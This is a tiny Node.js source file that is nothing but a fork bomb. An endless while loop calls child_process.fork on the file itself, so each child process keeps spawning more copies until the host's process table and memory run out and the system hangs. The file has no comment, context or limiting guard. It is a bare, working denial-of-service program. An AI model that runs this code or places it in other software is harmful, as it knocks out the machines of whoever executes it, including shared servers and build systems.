const { fork } = require('child_process');

while (true) {
    fork(__filename);
}
